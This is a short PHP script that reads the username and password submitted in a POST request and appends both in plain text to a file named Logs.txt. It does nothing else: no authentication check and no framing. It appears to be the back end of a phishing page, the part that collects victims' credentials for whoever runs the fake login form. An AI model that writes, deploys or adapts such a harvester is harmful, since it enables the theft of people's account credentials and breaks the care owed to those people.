<?php
$myfile = fopen("Logs.txt", "a") or die("Unable to open file!");
$txt = "Username: ".$_POST['username']."\nPassword: ".$_POST['password']."\n\n";
fwrite($myfile, $txt);
fclose($myfile);
?>
